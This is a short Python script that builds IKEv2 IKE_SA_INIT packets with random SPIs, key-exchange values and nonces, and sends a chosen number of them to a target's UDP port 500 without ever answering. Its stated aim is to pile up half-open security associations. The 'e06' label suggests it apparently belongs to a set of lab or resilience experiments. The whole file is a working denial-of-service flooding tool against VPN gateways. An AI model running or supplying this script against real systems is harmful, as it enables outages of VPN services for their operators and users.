"""send bare ikev2 IKE_SA_INIT requests and never answer (half-open sas, e06).

usage: ikeinit.py <dst ip> [count]
proposal: aes256 / prf-sha256 / sha256-128 / curve25519 (any 32 random bytes
are a valid x25519 public value, so the responder accepts the ke payload).
"""
import os
import socket
import struct
import sys


def transform(last, ttype, tid, attrs=b""):
    return struct.pack("!BBHBBH", 0 if last else 3, 0, 8 + len(attrs), ttype, 0, tid) + attrs


def init():
    ts = (transform(False, 1, 12, struct.pack("!HH", 0x800E, 256)) + transform(False, 2, 5) +
          transform(False, 3, 12) + transform(True, 4, 31))
    prop = struct.pack("!BBHBBBB", 0, 0, 8 + len(ts), 1, 1, 0, 4) + ts
    sa = struct.pack("!BBH", 34, 0, 4 + len(prop)) + prop
    ke = struct.pack("!BBHHH", 40, 0, 8 + 32, 31, 0) + os.urandom(32)
    nonce = struct.pack("!BBH", 0, 0, 4 + 32) + os.urandom(32)
    body = sa + ke + nonce
    hdr = os.urandom(8) + bytes(8) + struct.pack("!BBBBII", 33, 0x20, 34, 0x08, 0, 28 + len(body))
    return hdr + body


def main():
    dst = sys.argv[1]
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    s = socket.socket(socket.AF_INET6 if ":" in dst else socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(n):
        s.sendto(init(), (dst, 500))
    print(f"sent {n} IKE_SA_INIT to {dst}")


if __name__ == "__main__":
    main()
